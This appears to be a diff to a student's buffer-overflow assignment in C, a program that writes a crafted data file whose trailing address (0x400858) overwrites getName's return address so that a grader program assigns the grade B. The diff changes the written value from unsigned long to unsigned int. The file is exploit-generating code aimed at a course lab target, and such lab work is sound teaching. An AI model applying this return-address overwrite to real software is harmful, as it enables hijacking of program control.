@@ -14,7 +14,7 @@
 int main(void){
    FILE *psFile;
    int i;
-   unsigned long ulData;
+   unsigned int ulData;
    psFile = fopen("dataB", "w");
 
    /* Puts names in buf array to be copied */ 
@@ -27,7 +27,7 @@ int main(void){
    /* Overwrites getName x30 return address with location
       of grade = B instruction in grader's main function*/ 
    ulData = 0x400858;
-   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
+   fwrite(&ulData, sizeof(unsigned int), 1, psFile);
    fclose(psFile); 
    return 0; 
 }
